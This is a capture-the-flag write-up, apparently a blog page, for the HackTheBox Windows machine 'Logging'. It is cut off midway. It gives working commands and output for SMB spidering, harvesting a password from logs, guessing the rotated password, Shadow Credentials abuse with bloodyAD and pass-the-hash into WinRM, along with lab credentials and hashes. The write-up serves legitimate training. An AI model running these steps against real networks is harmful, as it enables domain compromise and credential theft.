@@ -1,0 +1,1208 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SecretMyth | Htb Logging</title>
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+
+<body>
+    <header class="site-header">
+        <div class="header-right">
+            <div class="brand">
+                <h1>SecretMyth</h1>
+                <p>An Anomaly..</p>
+            </div>
+            <button id="theme-toggle" aria-label="Toggle Dark/Light Mode">
+                <span id="theme-icon">🌙</span>
+            </button>
+        </div>
+    </header>
+
+    <main class="content">
+        <h1 id="hackthebox">HackTheBox</h1>
+
+<h2 id="machine-logging">Machine: Logging</h2>
+
+<ul>
+  <li>Target-IP: <code class="language-plaintext highlighter-rouge">10.129.245.130</code></li>
+  <li>OS: <code class="language-plaintext highlighter-rouge">Windows</code></li>
+  <li>Difficulty: <code class="language-plaintext highlighter-rouge">Medium</code></li>
+  <li>Initial Creds: <code class="language-plaintext highlighter-rouge">wallace.everette</code>:<code class="language-plaintext highlighter-rouge">Welcome2026@</code></li>
+</ul>
+
+<h1 id="1-reconnaissance">1. Reconnaissance</h1>
+
+<h2 id="11-port-scan">1.1 Port Scan</h2>
+
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE       REASON          VERSION
+53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
+80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
+|_http-title: IIS Windows Server
+| http-methods:
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2026-04-22 03:06:44Z<span class="o">)</span>
+135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: logging.htb, Site: Default-First-Site-Name<span class="o">)</span>
+| ssl-cert: Subject:
+| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
+| Issuer: <span class="nv">commonName</span><span class="o">=</span>logging-DC01-CA/domainComponent<span class="o">=</span>logging
+| Public Key <span class="nb">type</span>: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-04-17T03:20:01
+| Not valid after:  2106-04-17T03:20:01
+| MD5:     8572 96de c6fa 1e08 d694 2448 68cf d20b
+| SHA-1:   8747 4415 e328 0940 a741 bace 327f a157 98d8 76e7
+| SHA-256: f7c9 1a1d afd7 0b23 d3eb 802c bad8 aabf 6ad8 0a7b 1b56 3b26 3aea c6ed 4d1b 8b93
+...[snip]...
+|_ssl-date: 2026-04-22T03:07:41+00:00<span class="p">;</span> +7h00m00s from scanner time.
+445/tcp  open  microsoft-ds? syn-ack ttl 127
+464/tcp  open  kpasswd5?     syn-ack ttl 127
+593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: logging.htb, Site: Default-First-Site-Name<span class="o">)</span>
+|_ssl-date: 2026-04-22T03:07:40+00:00<span class="p">;</span> +6h59m59s from scanner time.
+| ssl-cert: Subject:
+| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
+| Issuer: <span class="nv">commonName</span><span class="o">=</span>logging-DC01-CA/domainComponent<span class="o">=</span>logging
+| Public Key <span class="nb">type</span>: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-04-17T03:20:01
+| Not valid after:  2106-04-17T03:20:01
+| MD5:     8572 96de c6fa 1e08 d694 2448 68cf d20b
+| SHA-1:   8747 4415 e328 0940 a741 bace 327f a157 98d8 76e7
+| SHA-256: f7c9 1a1d afd7 0b23 d3eb 802c bad8 aabf 6ad8 0a7b 1b56 3b26 3aea c6ed 4d1b 8b93
+...[snip]...
+3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: logging.htb, Site: Default-First-Site-Name<span class="o">)</span>
+|_ssl-date: 2026-04-22T03:07:41+00:00<span class="p">;</span> +7h00m00s from scanner time.
+| ssl-cert: Subject:
+| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
+| Issuer: <span class="nv">commonName</span><span class="o">=</span>logging-DC01-CA/domainComponent<span class="o">=</span>logging
+| Public Key <span class="nb">type</span>: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-04-17T03:20:01
+| Not valid after:  2106-04-17T03:20:01
+| MD5:     8572 96de c6fa 1e08 d694 2448 68cf d20b
+| SHA-1:   8747 4415 e328 0940 a741 bace 327f a157 98d8 76e7
+| SHA-256: f7c9 1a1d afd7 0b23 d3eb 802c bad8 aabf 6ad8 0a7b 1b56 3b26 3aea c6ed 4d1b 8b93
+...[snip]...
+3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: logging.htb, Site: Default-First-Site-Name<span class="o">)</span>
+| ssl-cert: Subject:
+| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
+| Issuer: <span class="nv">commonName</span><span class="o">=</span>logging-DC01-CA/domainComponent<span class="o">=</span>logging
+| Public Key <span class="nb">type</span>: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-04-17T03:20:01
+| Not valid after:  2106-04-17T03:20:01
+| MD5:     8572 96de c6fa 1e08 d694 2448 68cf d20b
+| SHA-1:   8747 4415 e328 0940 a741 bace 327f a157 98d8 76e7
+| SHA-256: f7c9 1a1d afd7 0b23 d3eb 802c bad8 aabf 6ad8 0a7b 1b56 3b26 3aea c6ed 4d1b 8b93
+...[snip]...
+|_ssl-date: 2026-04-22T03:07:40+00:00<span class="p">;</span> +7h00m00s from scanner time.
+5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: Host: DC01<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled and required
+| smb2-time:
+|   <span class="nb">date</span>: 2026-04-22T03:07:33
+|_  start_date: N/A
+| p2p-conficker:
+|   Checking <span class="k">for </span>Conficker.C or higher...
+|   Check 1 <span class="o">(</span>port 34259/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Couldn<span class="s1">'t connect)
+|   Check 2 (port 9483/tcp): CLEAN (Couldn'</span>t connect<span class="o">)</span>
+|   Check 3 <span class="o">(</span>port 19554/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+|   Check 4 <span class="o">(</span>port 57507/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Failed to receive data<span class="o">)</span>
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
+</code></pre></div></div>
+
+<h3 id="111-nmap-analysis">1.1.1 Nmap Analysis</h3>
+
+<p>The comprehensive Nmap scan identifies the target as a Windows Domain Controller (<code class="language-plaintext highlighter-rouge">DC01.logging.htb</code>) with several critical takeaways for our attack path:</p>
+
+<ul>
+  <li><strong>Core Infrastructure:</strong> The presence of DNS (53), Kerberos (88), and LDAP (389/3268) confirms this is a Domain Controller. The web server (Port 80) running IIS 10.0 indicates this is likely Windows Server 2016, 2019, or 2022.</li>
+  <li><strong>Active Directory Certificate Services (AD CS):</strong> The SSL certificates exposed on the LDAPS ports (636/3269) reveal the Issuer as <code class="language-plaintext highlighter-rouge">logging-DC01-CA</code>. This strongly implies that AD CS is running directly on the Domain Controller, opening the door for potential ESCx certificate abuse pathways later in the engagement.</li>
+  <li><strong>SMB Configuration:</strong> Port 445 is open, but Nmap notes <code class="language-plaintext highlighter-rouge">Message signing enabled and required</code>. This means direct NTLM relaying to SMB (e.g., via <code class="language-plaintext highlighter-rouge">ntlmrelayx</code>) is dead in the water for this host.</li>
+  <li><strong>Remote Access:</strong> WinRM (Port 5985) is exposed. Once we compromise an account with the appropriate group memberships (e.g., Remote Management Users), we have a direct path to a PowerShell session.</li>
+  <li><strong>Clock Skew Alert:</strong> Nmap detected a significant clock skew of <code class="language-plaintext highlighter-rouge">+7h00m00s</code>. Kerberos is highly time-sensitive (typically failing if the desync is greater than 5 minutes). We will need to sync our attack machine’s clock or utilize tools like <code class="language-plaintext highlighter-rouge">fake_time</code> to prevent <code class="language-plaintext highlighter-rouge">KRB_AP_ERR_SKEW</code> errors when requesting tickets.</li>
+</ul>
+
+<p><strong>Host Routing:</strong>
+Before proceeding, the identified domain and hostnames must be added to our local <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file to ensure proper DNS resolution, which is mandatory for Kerberos authentication.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Generate hosts file</span>
+➜ nxc smb 10.129.245.130 <span class="nt">--generate-hosts-file</span> /tmp/hosts.txt
+SMB         10.129.245.130  445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:logging.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
+
+<span class="c"># Update local DNS routing</span>
+➜ <span class="nb">echo</span> <span class="s1">'10.129.245.130     DC01.logging.htb logging.htb DC01'</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.129.245.130     DC01.logging.htb logging.htb DC01
+</code></pre></div></div>
+
+<hr />
+
+<h1 id="2-smb-enumeration">2. SMB Enumeration</h1>
+
+<h2 id="21-share-discovery-and-spidering">2.1 Share Discovery and Spidering</h2>
+
+<p>With the initial credentials (<code class="language-plaintext highlighter-rouge">wallace.everette</code>:<code class="language-plaintext highlighter-rouge">Welcome2026@</code>) provided for the engagement, the most efficient next step is to enumerate accessible file shares before executing heavier Active Directory mapping tools. We leverage NetExec’s <code class="language-plaintext highlighter-rouge">spider_plus</code> module to quickly index readable shares and identify potentially sensitive files across the Domain Controller.</p>
+
+<pre><code class="language-Bash"># Enumerate and spider readable SMB shares
+➜ nxc smb dc01.logging.htb \
+    -u 'wallace.everette' -p 'Welcome2026@' \
+    -M spider_plus
+SMB         10.129.245.130   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.245.130   445    DC01             [+] logging.htb\wallace.everette:Welcome2026@
+SPIDER_PLUS 10.129.245.130   445    DC01             [*] Started module spidering_plus with the following options:
+SPIDER_PLUS 10.129.245.130   445    DC01             [*]  DOWNLOAD_FLAG: False
+SPIDER_PLUS 10.129.245.130   445    DC01             [*]     STATS_FLAG: True
+SPIDER_PLUS 10.129.245.130   445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
+SPIDER_PLUS 10.129.245.130   445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
+SPIDER_PLUS 10.129.245.130   445    DC01             [*]  MAX_FILE_SIZE: 50 KB
+SPIDER_PLUS 10.129.245.130   445    DC01             [*]  OUTPUT_FOLDER: /home/deus/.nxc/modules/nxc_spider_plus
+SMB         10.129.245.130   445    DC01             [*] Enumerated shares
+SMB         10.129.245.130   445    DC01             Share           Permissions     Remark
+SMB         10.129.245.130   445    DC01             -----           -----------     ------
+SMB         10.129.245.130   445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.245.130   445    DC01             C$                              Default share
+SMB         10.129.245.130   445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.245.130   445    DC01             Logs            READ
+SMB         10.129.245.130   445    DC01             NETLOGON        READ            Logon server share
+SMB         10.129.245.130   445    DC01             SYSVOL          READ            Logon server share
+SMB         10.129.245.130   445    DC01             WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.
+SPIDER_PLUS 10.129.245.130   445    DC01             [+] Saved share-file metadata to "/home/deus/.nxc/modules/nxc_spider_plus/10.129.245.130.json".
+SPIDER_PLUS 10.129.245.130   445    DC01             [*] SMB Shares:           7 (ADMIN$, C$, IPC$, Logs, NETLOGON, SYSVOL, WSUSTemp)
+SPIDER_PLUS 10.129.245.130   445    DC01             [*] SMB Readable Shares:  4 (IPC$, Logs, NETLOGON, SYSVOL)
+SPIDER_PLUS 10.129.245.130   445    DC01             [*] SMB Filtered Shares:  1
+SPIDER_PLUS 10.129.245.130   445    DC01             [*] Total folders found:  19
+SPIDER_PLUS 10.129.245.130   445    DC01             [*] Total files found:    9
+SPIDER_PLUS 10.129.245.130   445    DC01             [*] File size average:    2.2 KB
+SPIDER_PLUS 10.129.245.130   445    DC01             [*] File size min:        22 B
+SPIDER_PLUS 10.129.245.130   445    DC01             [*] File size max:        8.29 KB
+</code></pre>
+
+<h3 id="211-smb-findings">2.1.1 SMB Findings</h3>
+
+<p>Alongside the standard default shares (<code class="language-plaintext highlighter-rouge">IPC$</code>, <code class="language-plaintext highlighter-rouge">NETLOGON</code>, <code class="language-plaintext highlighter-rouge">SYSVOL</code>), the enumeration reveals a non-default, readable share named <strong><code class="language-plaintext highlighter-rouge">Logs</code></strong>. Given the machine’s name and this finding, inspecting the contents of this share is our immediate next step.</p>
+
+<h2 id="22-share-inspection-and-credential-discovery">2.2 Share Inspection and Credential Discovery</h2>
+
+<p>After identifying the <code class="language-plaintext highlighter-rouge">Logs</code> share via <code class="language-plaintext highlighter-rouge">spider_plus</code>, we review the generated JSON output to determine the contents.</p>
+
+<pre><code class="language-JSON">{
+    "Logs": {
+        "Audit_Heartbeat.log": {
+            "size": "1.26 KB"
+        },
+        "IdentitySync_Trace_20260219.log": {
+            "size": "8.29 KB"
+        },
+        "Service_State.log": {
+            "size": "468 B"
+        },
+        "TaskMonitor.log": {
+            "size": "1.14 KB"
+        }
+    }
+}
+</code></pre>
+
+<p>We utilize <code class="language-plaintext highlighter-rouge">smbclient</code> to connect to the share and recursively download all files for offline analysis.</p>
+
+<pre><code class="language-Bash"># Download all files from the Logs share
+➜ smbclient //logging.htb/Logs \
+    -U 'LOGGING/wallace.everette%Welcome2026@' \
+    -c 'recurse ON; prompt OFF; mget *'
+</code></pre>
+
+<h3 id="221-log-analysis">2.2.1 Log Analysis</h3>
+
+<p>Once the files are downloaded locally, we grep the directory for sensitive keywords such as “pass”, “cred”, or “key”.</p>
+
+<pre><code class="language-Bash"># Search for potential credentials
+➜ grep -ir pass Logs
+Logs/IdentitySync_Trace_20260219.log:[2026-02-09 03:00:03.125] [PID:4102] [Thread:04] VERBOSE - ConnectionContext Dump: { Domain: "logging.htb", Server: "DC01", SSL: "False", BindUser: "LOGGING\svc_recovery", BindPass: "Em3rg3ncyPa$$2025", Timeout: 30 }
+</code></pre>
+
+<p>The search yields a cleartext credential in the <code class="language-plaintext highlighter-rouge">IdentitySync_Trace_20260219.log</code> file for the user <code class="language-plaintext highlighter-rouge">svc_recovery</code> (<code class="language-plaintext highlighter-rouge">Em3rg3ncyPa$$2025</code>). However, reading further down in the same log file reveals a critical caveat: entries dated ten days later show the synchronization task failing with <code class="language-plaintext highlighter-rouge">LDAP_INVALID_CREDENTIALS</code> for this exact account.</p>
+
+<p><strong>Analysis:</strong></p>
+
+<p>While the log exposes a highly complex password, the subsequent authentication failures indicate this password is no longer active. Rather than discarding it, we will use this invalid password as a base string to generate a targeted mutation list, anticipating that the user (or administrator) simply iterated the year or altered a minor character during a forced password rotation.</p>
+
+<h2 id="26-password-mutation--credential-validation">2.6 Password Mutation &amp; Credential Validation</h2>
+
+<p>With the base password (<code class="language-plaintext highlighter-rouge">Em3rg3ncyPa$$2025</code>) and the knowledge that it is invalid, we test it against the Domain Controller to observe the specific error responses.</p>
+
+<p>First, we attempt standard NTLM authentication using NetExec:</p>
+
+<pre><code class="language-Bash"># Initial validation attempt (NTLM)
+➜ nxc smb dc01.logging.htb \
+    -u 'svc_recovery' -p 'Em3rg3ncyPa$$2025'
+SMB         10.129.245.130   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.245.130   445    DC01             [-] logging.htb\svc_recovery:Em3rg3ncyPa$$2025 STATUS_ACCOUNT_RESTRICTION
+</code></pre>
+
+<p>The <code class="language-plaintext highlighter-rouge">STATUS_ACCOUNT_RESTRICTION</code> error indicates that the account is prevented from logging in under the current context—often because NTLM authentication is explicitly disabled for the account (or domain-wide), forcing the use of Kerberos.</p>
+
+<p>We append the <code class="language-plaintext highlighter-rouge">-k</code> flag to force Kerberos authentication:</p>
+
+<pre><code class="language-Bash"># Force Kerberos authentication
+➜ nxc smb dc01.logging.htb \
+    -u 'svc_recovery' -p 'Em3rg3ncyPa$$2025' -k
+SMB         dc01.logging.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc01.logging.htb 445    DC01             [-] logging.htb\svc_recovery:Em3rg3ncyPa$$2025 KDC_ERR_PREAUTH_FAILED
+</code></pre>
+
+<p>The <code class="language-plaintext highlighter-rouge">KDC_ERR_PREAUTH_FAILED</code> error definitively confirms the password is wrong, aligning with the <code class="language-plaintext highlighter-rouge">LDAP_INVALID_CREDENTIALS</code> error found in the log file.</p>
+
+<h3 id="261-manual-mutation--clock-skew-evasion">2.6.1 Manual Mutation &amp; Clock Skew Evasion</h3>
+
+<p>Assuming a standard password rotation policy, we manually mutate the year in the password from <code class="language-plaintext highlighter-rouge">2025</code> to <code class="language-plaintext highlighter-rouge">2026</code> and test again via Kerberos:</p>
+
+<pre><code class="language-Bash"># Test mutated password
+➜ nxc smb dc01.logging.htb \
+    -u 'svc_recovery' -p 'Em3rg3ncyPa$$2026' -k
+SMB         dc01.logging.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc01.logging.htb 445    DC01             [-] logging.htb\svc_recovery:Em3rg3ncyPa$$2026 KRB_AP_ERR_SKEW
+</code></pre>
+
+<p>The error changes to <code class="language-plaintext highlighter-rouge">KRB_AP_ERR_SKEW</code>. This is an excellent indicator: the Domain Controller did <em>not</em> reject the password (pre-authentication succeeded), but it rejected the ticket request because our local machine’s clock is too far out of sync with the Domain Controller. (Recall the <code class="language-plaintext highlighter-rouge">+7h00m00s</code> clock skew identified during our initial Nmap scan).</p>
+
+<p>To resolve this without altering our host system’s time, we configure our local Kerberos environment and utilize <code class="language-plaintext highlighter-rouge">faketime</code> to dynamically synchronize the clock offset for the command execution or use classic method via <code class="language-plaintext highlighter-rouge">ntpdate</code>.</p>
+
+<pre><code class="language-Bash"># Generate local krb5.conf for proper routing
+➜ nxc smb dc01.logging.htb --generate-krb5-file /tmp/krb5.conf
+➜ cat /tmp/krb5.conf | sudo tee /etc/krb5.conf
+
+# Execute NetExec wrapped in fake_time
+➜ fake_time dc01.logging.htb \
+nxc smb dc01.logging.htb \
+    -u 'svc_recovery' -p 'Em3rg3ncyPa$$2026' -k
+...[snip]..
+
+SMB         dc01.logging.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc01.logging.htb 445    DC01             [+] logging.htb\svc_recovery:Em3rg3ncyPa$$2026
+</code></pre>
+
+<p><strong>Result:</strong> The mutation was successful. We now have a second set of valid domain credentials.</p>
+
+<h2 id="27-kerberos-ticket-generation">2.7 Kerberos Ticket Generation</h2>
+
+<p>To interact securely with LDAP and execute the attack without triggering NTLM or pre-authentication restrictions, we first request a TGT for <code class="language-plaintext highlighter-rouge">svc_recovery</code>.</p>
+
+<p>Due to the extreme clock skew, we wrap <code class="language-plaintext highlighter-rouge">getTGT.py</code> with <code class="language-plaintext highlighter-rouge">fake_time</code> to align our ticket timestamps with the Domain Controller.</p>
+
+<pre><code class="language-Bash"># Request a TGT for svc_recovery
+➜ fake_time dc01.logging.htb \
+getTGT.py 'logging.htb/svc_recovery:Em3rg3ncyPa$$2026'
+
+...[snip]...
+Impacket v0.14.0.dev0+20260420.123356.9afc09b9 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Saving ticket in svc_recovery.ccache
+
+# Verify the cached ticket
+➜ klist svc_recovery.ccache
+Ticket cache: FILE:svc_recovery.ccache
+Default principal: svc_recovery@LOGGING.HTB
+
+Valid starting       Expires              Service principal
+04/22/2026 09:40:13  04/22/2026 13:40:13  krbtgt/LOGGING.HTB@LOGGING.HTB
+        renew until 04/22/2026 13:40:13
+</code></pre>
+
+<h2 id="28-targeted-bloodhound-enumeration">2.8 Targeted BloodHound Enumeration</h2>
+
+<p>As noted during our initial enumeration, the BloodHound data collected for our foothold user (<code class="language-plaintext highlighter-rouge">wallace.everette</code>) yielded no direct privilege escalation paths, forcing us to pivot to SMB share analysis. Now, with a second set of valid domain credentials (<code class="language-plaintext highlighter-rouge">svc_recovery</code>:<code class="language-plaintext highlighter-rouge">Em3rg3ncyPa$$2026</code>) confirmed, we must re-evaluate the Active Directory landscape from this new context.</p>
+
+<pre><code class="language-Bash"># Collect BloodHound data as svc_recovery
+➜ fake_time dc01.logging.htb \
+env KRB5CCNAME=svc_recovery.ccache \
+rusthound-ce \
+    -d logging.htb -f dc01.logging.htb -k \
+    --zip -c All
+</code></pre>
+
+<h3 id="271-privilege-analysis-svc_recovery">2.7.1 Privilege Analysis: svc_recovery</h3>
+
+<p>Ingesting the updated data and setting <code class="language-plaintext highlighter-rouge">svc_recovery</code> as our starting node in BloodHound reveals a significant shift in our domain privileges. Unlike our initial foothold, this account possesses a direct, exploitable ACL relationship.</p>
+
+<p align="center">
+  <img src="../assets/images/bh_svc_recovery_genericwrite.png" alt="BloodHound - svc_recovery GenericWrite" />
+</p>
+
+<p><strong>Analysis of Findings:</strong>
+The graph clearly shows that <code class="language-plaintext highlighter-rouge">svc_recovery</code> holds <strong>GenericWrite</strong> privileges over the <code class="language-plaintext highlighter-rouge">MSA_HEALTH$</code> account.</p>
+
+<p><code class="language-plaintext highlighter-rouge">GenericWrite</code> is a powerful primitive. It grants us the ability to update any non-protected attribute on the target object. For a user or service account like <code class="language-plaintext highlighter-rouge">MSA_HEALTH$</code>, this immediately opens up a few high-percentage attack paths:</p>
+<ol>
+  <li><strong>Targeted Kerberoasting:</strong> We can write a dummy Service Principal Name (SPN) to the <code class="language-plaintext highlighter-rouge">MSA_HEALTH$</code> account and then request its TGS ticket to crack offline.</li>
+  <li><strong>Shadow Credentials:</strong> If the domain controller supports PKINIT, we can write to the <code class="language-plaintext highlighter-rouge">msDS-KeyCredentialLink</code> attribute to generate a certificate for the account and authenticate directly.</li>
+  <li><strong>Password Reset:</strong> Depending on the exact environmental constraints, <code class="language-plaintext highlighter-rouge">GenericWrite</code> often allows forcing a password reset on the target object.</li>
+</ol>
+
+<hr />
+
+<h1 id="3-lateral-movement-shadow-credentials-abuse">3. Lateral Movement: Shadow Credentials Abuse</h1>
+
+<p>With <strong>GenericWrite</strong> privileges over <code class="language-plaintext highlighter-rouge">MSA_HEALTH$</code>, we have the ability to modify its Active Directory object properties. Since the domain controller supports PKINIT (evidenced by the presence of AD CS), the most stealthy and direct path to compromise this account is a <strong>Shadow Credentials</strong> attack.</p>
+
+<p>By writing a custom certificate to the <code class="language-plaintext highlighter-rouge">msDS-KeyCredentialLink</code> attribute of <code class="language-plaintext highlighter-rouge">MSA_HEALTH$</code>, we can trick the Key Distribution Center (KDC) into issuing a Kerberos Ticket Granting Ticket (TGT) for the account using our attacker-controlled asymmetric key pair.</p>
+
+<h2 id="31-executing-the-attack-bloodyad">3.1 Executing the Attack (bloodyAD)</h2>
+
+<p>With a valid TGT cached, we utilize <code class="language-plaintext highlighter-rouge">bloodyAD</code> to orchestrate the Shadow Credentials attack.</p>
+
+<p>We use the <code class="language-plaintext highlighter-rouge">env KRB5CCNAME=svc_recovery.ccache</code> inline variable to force <code class="language-plaintext highlighter-rouge">bloodyAD</code> to authenticate via our cached Kerberos ticket (<code class="language-plaintext highlighter-rouge">-k</code>). The tool automatically generates an RSA key pair, writes the public key to the target’s <code class="language-plaintext highlighter-rouge">msDS-KeyCredentialLink</code> attribute, and performs the PKINIT authentication to retrieve the target’s TGT and NT hash.</p>
+
+<pre><code class="language-Bash"># Inject Shadow Credentials and retrieve the NT hash
+➜ env KRB5CCNAME=svc_recovery.ccache \
+fake_time dc01.logging.htb \
+bloodyAD -H dc01.logging.htb -d logging.htb \
+    -u 'svc_recovery' -k \
+    add shadowCredentials 'msa_health$'
+
+...[snip]...
+[+] KeyCredential generated with following sha256 of RSA key: 8068eb20e242831db3046e20707b7bf5dfb663d2521d7db8be5e6f05498a2cfd
+[+] TGT stored in ccache file msa_health_vW.ccache
+
+NT: 603fc24ee01a9409f83c9d1d701485c5
+</code></pre>
+
+<p><strong>Result:</strong> The attack successfully compromises the <code class="language-plaintext highlighter-rouge">MSA_HEALTH$</code> account, yielding its NT Hash (<code class="language-plaintext highlighter-rouge">603fc24ee01a9409f83c9d1d701485c5</code>) and a valid TGT (<code class="language-plaintext highlighter-rouge">msa_health_vW.ccache</code>), granting us full access to its privileges.</p>
+
+<hr />
+
+<h1 id="4-initial-access-dc01">4. Initial Access (DC01)</h1>
+
+<h2 id="41-pass-the-hash-via-winrm">4.1 Pass-the-Hash via WinRM</h2>
+
+<p>With the NT hash for the <code class="language-plaintext highlighter-rouge">msa_health$</code> service account successfully extracted, we utilize <code class="language-plaintext highlighter-rouge">evil-winrm</code> to perform a Pass-the-Hash (PtH) attack. This bypasses the need for the cleartext password and provides us with an interactive PowerShell session on the Domain Controller.</p>
+
+<pre><code class="language-Bash"># Authenticate via WinRM using the NT hash
+➜ evil_winrmexec logging.htb/'msa_health$'@dc01.logging.htb \
+        -hashes :603fc24ee01a9409f83c9d1d701485c5
+
+...[snip]...
+
+PS C:\Users\msa_health$\Documents&gt; whoami; hostname
+logging\msa_health$
+DC01
+</code></pre>
+
+<h3 id="411-environment-reconnaissance">4.1.1 Environment Reconnaissance</h3>
+
+<p>Upon gaining access, we perform basic situational awareness. The <code class="language-plaintext highlighter-rouge">msa_health$</code> account possesses standard service privileges but lacks administrative rights.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\msa_health</span><span class="err">$</span><span class="nx">\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">
+
+</span><span class="n">PRIVILEGES</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
+</span><span class="o">----------------------</span><span class="w">
+
+</span><span class="n">Privilege</span><span class="w"> </span><span class="nx">Name</span><span class="w">                </span><span class="nx">Description</span><span class="w">                    </span><span class="nx">State</span><span class="w">
+</span><span class="o">=============================</span><span class="w"> </span><span class="o">==============================</span><span class="w"> </span><span class="o">=======</span><span class="w">
+</span><span class="n">SeMachineAccountPrivilege</span><span class="w">     </span><span class="nx">Add</span><span class="w"> </span><span class="nx">workstations</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">domain</span><span class="w">     </span><span class="nx">Enabled</span><span class="w">
+</span><span class="n">SeChangeNotifyPrivilege</span><span class="w">       </span><span class="nx">Bypass</span><span class="w"> </span><span class="nx">traverse</span><span class="w"> </span><span class="nx">checking</span><span class="w">       </span><span class="nx">Enabled</span><span class="w">
+</span><span class="n">SeIncreaseWorkingSetPrivilege</span><span class="w"> </span><span class="nx">Increase</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">process</span><span class="w"> </span><span class="nx">working</span><span class="w"> </span><span class="nx">set</span><span class="w"> </span><span class="nx">Enabled</span><span class="w">
+</span></code></pre></div></div>
+
+<p>A survey of the <code class="language-plaintext highlighter-rouge">C:\Users</code> directory reveals the active profiles on the system. Notably, the user flag is not present in the service account’s directory, and the target users <code class="language-plaintext highlighter-rouge">toby.brynleigh</code> (Domain Admin) and <code class="language-plaintext highlighter-rouge">jaylee.clifton</code> have existing profiles.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\msa_health</span><span class="err">$</span><span class="nx">\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">dir</span><span class="w"> </span><span class="nx">c:\users</span><span class="w">
+
+    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\users</span><span class="w">
+
+</span><span class="n">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
+</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">
